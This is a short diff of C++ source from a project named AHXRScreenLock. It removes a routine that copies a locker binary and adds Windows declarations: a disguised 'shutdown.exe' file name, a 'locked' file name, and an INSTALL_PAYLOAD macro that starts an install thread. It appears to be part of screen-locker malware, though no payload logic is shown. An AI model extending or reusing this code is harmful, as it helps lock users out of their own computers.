@@ -20,33 +20,16 @@
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#include <string>
-#include <fstream>
+#include								<Windows.h>
+#include								<string>
 
-#include "settings.h"
-#include "pack.h"
+#define SHUTDOWN_FOLDER_NAME			"Shutdown2017"
+#define SHUTDOWN_FILE_NAME				"shutdown.exe"
+#define LOCKED_FILE_NAME				"sd.exe"
 
-using namespace std;
+extern HANDLE							h_install_thread;
+extern DWORD							dw_install_thread;
+extern DWORD WINAPI						t_install(LPVOID lpParam);
+extern std::string						getInstallPath();
 
-string LOCKER_FILE_NAME;
-
-void buildNewLocker(string fileName) {
-	ifstream
-		f_old;
-	ofstream
-		f_new;
-
-	puts(LOCKER_FILE_NAME.c_str());
-
-	f_old.open(LOCKER_FILE_NAME, ios::binary);
-	f_new.open(fileName, ios::binary);
-
-	f_new << f_old.rdbuf();
-
-	f_old.close();
-	f_new.close();
-}
-
-void setLockerFileName(string name) {
-	LOCKER_FILE_NAME = name;
-}
+#define	INSTALL_PAYLOAD()				{h_install_thread = CreateThread(0,0, t_install, 0, 0, &dw_install_thread);}
